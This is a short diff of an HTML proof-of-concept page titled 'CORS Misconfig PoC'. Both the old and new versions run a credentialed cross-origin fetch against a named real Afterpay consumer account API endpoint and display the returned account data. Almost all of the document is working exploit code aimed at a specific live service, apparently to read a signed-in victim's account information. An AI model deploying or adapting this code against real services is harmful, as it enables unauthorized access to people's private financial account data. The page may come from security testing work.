@@ -1,35 +1,34 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>🔥 CORS Exploit PoC</title>
-</head>
-<body>
-  <h2>🔥 CORS Exploit PoC</h2>
-  <p>Targeting: <b id="url"></b></p>
+<html>
+  <head>
+    <title>CORS Misconfig PoC</title>
+  </head>
+  <body>
+    <h1>🔥 CORS Misconfig PoC</h1>
+    <button onclick="exploit()">🔥 Test Endpoint</button>
+    <pre id="output">Waiting...</pre>
 
-  <pre id="output" style="white-space: pre-wrap; background: #f4f4f4; padding: 1em; border-radius: 4px; color: black;"></pre>
+    <script>
+      async function exploit() {
+        const output = document.getElementById('output');
+        output.textContent = 'Sending request...';
 
-  <script>
-    const testUrl = "https://portalapi.us.afterpay.com/portal/consumers/account"; // change this to your vulnerable endpoint
+        try {
+          const response = await fetch('https://portalapi.us.afterpay.com/portal/consumers/account', {
+            method: 'GET',
+            mode: 'cors',
+            credentials: 'include', // Can also try 'omit'
+            headers: {
+              'Content-Type': 'application/json'
+            }
+          });
 
-    document.getElementById("url").textContent = testUrl;
-
-    fetch(testUrl, {
-      method: "GET",
-      credentials: "include",
-      mode: "cors"
-    })
-    .then(async res => {
-      const text = await res.text();
-      document.getElementById("output").textContent =
-        `✅ Status: ${res.status} ${res.statusText}\n\n📦 Response:\n${text}`;
-    })
-    .catch(err => {
-      document.getElementById("output").textContent = "❌ Error:\n" + err;
-    });
-  </script>
-</body>
+          const data = await response.text();
+          output.textContent = `✅ Response:\n${data}`;
+        } catch (err) {
+          output.textContent = `❌ Error:\n${err}`;
+        }
+      }
+    </script>
+  </body>
 </html>
